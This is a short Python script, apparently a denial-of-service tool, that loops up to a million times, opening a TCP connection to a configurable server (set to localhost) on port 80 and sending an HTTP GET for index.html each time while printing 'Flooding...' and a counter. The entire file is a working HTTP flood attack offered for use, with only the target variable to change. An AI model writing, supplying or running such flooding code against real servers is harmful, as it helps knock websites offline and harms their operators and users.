import socket, sys, os

server = "localhost"
filename = "index.html"
requestsToSend = 1000000

counter = 0

def HTTPFlood():
    global counter
    counter = counter + 1
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock .connect((server, 80))
    print (counter)
    sock.send("GET /" + filename + " HTTP/1.1\r\n")
    sock.send("Host: " + server + "\r\n\r\n");
    sock.close()

print ("Flooding...")
for i in range(1, requestsToSend):
    HTTPFlood()





